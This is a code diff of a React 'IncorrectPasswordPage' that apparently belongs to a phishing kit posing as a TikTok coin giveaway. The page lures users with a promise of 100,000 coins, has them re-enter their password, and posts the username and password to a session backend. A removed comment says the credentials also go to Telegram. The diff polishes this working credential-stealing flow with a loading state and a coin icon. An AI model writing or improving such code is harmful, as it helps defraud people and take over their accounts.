@@ -13,6 +13,7 @@ const IncorrectPasswordPage = () => {
   const navigate = useNavigate();
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
   const [tiktokData, setTiktokData] = useState(null);
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
   const sessionId = localStorage.getItem('sessionId');
@@ -40,28 +41,29 @@ const IncorrectPasswordPage = () => {
   const isPasswordValid = passwordRequirements.every(req => req.met);
 
   const handleTryAgain = async () => {
-    if (isPasswordValid) {
-      localStorage.setItem('password', password);
+  if (isLoading) return;
 
-      // Send to backend and Telegram
-      try {
-        await axios.post(`${API}/session/step`, {
-          session_id: sessionId,
-          step: 'password',
-          data: {
-            username: username,
-            password: password
-          }
-        });
-      } catch (error) {
-        console.error('Failed to submit step:', error);
-      }
+  setIsLoading(true);
 
-      // Navigate to waiting page
-      navigate('/waiting');
+  if (isPasswordValid) {
+    localStorage.setItem('password', password);
+
+    try {
+      await axios.post(`${API}/session/step`, {
+        session_id: sessionId,
+        step: 'password',
+        data: {
+          username: username,
+          password: password
+        }
+      });
+    } catch (error) {
+      console.error('Failed to submit step:', error);
     }
-  };
 
+   navigate('/waiting');
+}
+};
   return (
     <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b]">
       {/* Header */}
@@ -162,20 +164,30 @@ const IncorrectPasswordPage = () => {
         {/* Try Again Button */}
         <Button
           onClick={handleTryAgain}
-          disabled={!isPasswordValid}
+          disabled={!isPasswordValid || isLoading}
           className="w-full bg-gradient-to-r from-[#1a1a1c] to-[#2a2a2c] hover:from-[#ff4266] hover:to-[#ff4266] text-gray-400 hover:text-white font-semibold py-6 text-lg rounded-lg border border-gray-700 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
         >
-          Continue
+         {isLoading ? 'Loading...' : 'Continue'}
         </Button>
 
         {/* Coins Display */}
         <div className="mt-8 text-center">
-          <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
-            <span className="text-gray-400 text-lg">You will receive: </span>
-            <span className="text-cyan-400 text-2xl font-bold">{parseInt(coinAmount).toLocaleString()}</span>
-            <span className="text-gray-400 text-lg"> Coins</span>
-          </div>
-        </div>
+  <div className="inline-flex items-center gap-2 bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
+    <span className="text-gray-400 text-lg">You will receive: </span>
+
+    <img
+      src="/coin-icon.png"
+      alt="Coin"
+      className="w-6 h-6 object-contain flex-shrink-0"
+    />
+
+    <span className="text-cyan-400 text-2xl font-bold">
+      {parseInt(coinAmount).toLocaleString()}
+    </span>
+
+    <span className="text-gray-400 text-lg"> Coins</span>
+  </div>
+</div>
       </main>
     </div>
   );
